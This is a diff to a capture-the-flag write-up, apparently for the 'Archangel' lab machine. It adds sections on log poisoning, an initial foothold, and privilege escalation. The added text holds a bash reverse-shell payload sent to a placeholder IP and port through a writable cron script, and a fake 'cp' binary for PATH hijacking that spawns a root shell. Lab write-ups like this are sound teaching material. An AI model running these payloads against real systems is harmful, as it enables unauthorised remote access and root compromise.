@@ -108,6 +108,8 @@
 
 ![image](https://github.com/user-attachments/assets/796d8211-a6b5-4b9c-b6df-65240e08382f)
 
+------------------------
+
 ### Local File Inclusion
 
 - I checked the source code and noticed that the `view` query allows us to read files
@@ -123,6 +125,8 @@ in php but we need to read the code to bypass the filters.We can read the `test.
 With the aid of the encoding filter,we can pass it out in encoded form instead of php. The filter above renders the file in base64 format.
 
 ![image](https://github.com/user-attachments/assets/f1c8f735-6a4b-4252-93df-7ede63cd3d86)
+
+------------------------
 
 ### Filters bypass
 
@@ -173,6 +177,8 @@ With the aid of the encoding filter,we can pass it out in encoded form instead o
 
 ![image](https://github.com/user-attachments/assets/c43c51a9-43c8-4c1f-8880-86061e2d247c)
 
+-----------------------------
+
 ### Poisoning apache log gain RCE
 
 - Apache server's log can be found in `/var/log/apache2/access.log`.
@@ -189,7 +195,62 @@ With the aid of the encoding filter,we can pass it out in encoded form instead o
 
 ![image](https://github.com/user-attachments/assets/45aa405e-aeb6-4026-b19b-4589acdbe6af)
 
+------------------------
+
 ### Initial Foothold
+
+- Reverse shell as `www-data`
+
+![image](https://github.com/user-attachments/assets/89fa8faf-4630-41de-bd32-99a0092a9765)
+
+-------------------------
+
+### Pivotiing to user `archangel`
+
+- File `/etc/crontab` shows that user `archangel` has a cron job that runs a script `/opt/helloworld.sh`
+
+![image](https://github.com/user-attachments/assets/aa87a41f-d0bb-4836-a89c-e46e186f0134)
+
+- We have write access to the file and can add reverse shell bash code to it.
+
+  Payload-:```echo -ne "#! /bin/bash\nbash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" > /opt/helloworld.sh```
+
+- Shell as `archangel`
+
+![image](https://github.com/user-attachments/assets/20fabd35-999b-4599-9946-06a7666efb1a)
+
+-----------------------------
+
+### Privesc with PATH HIJACKING
+
+- I ran `find / -type f -perm -u=s 2</dev/null` to check for suid binaries and discovered a root binary with suid permission in archangel's directory.
+
+![image](https://github.com/user-attachments/assets/811acffa-8661-4c3a-bb9d-1757ee26de7b)
+
+- Running strings on the binary shows it uses the `cp` binary to copy files but the absolute path is not stated, we can hijack the path and run a malicious as and execute root commands.
+
+![image](https://github.com/user-attachments/assets/84a423af-d103-432e-b33c-a860f1746c29)
+
+- I added `/tmp` to the path variable, so I can create a malicious binary in `/tmp` and gain root.
+
+  Code to create mailicious file-:```echo -ne "#! /usr/bin/env python3\nimport os\nos.setuid(0)\nos.setgid(0)\nos.system('bash -p')" > /tmp/cp```
+
+![image](https://github.com/user-attachments/assets/2d823ab6-1d46-4656-bb29-84465c05296b)
+
+- Root shell
+
+![image](https://github.com/user-attachments/assets/afe25f5c-b6dc-45ab-a930-cc94f38eda0a)
+
+-----------------------
+
+### THANKS FOR READING !!!
+
+-----------------------
+
+
+
+
+
 
 
 
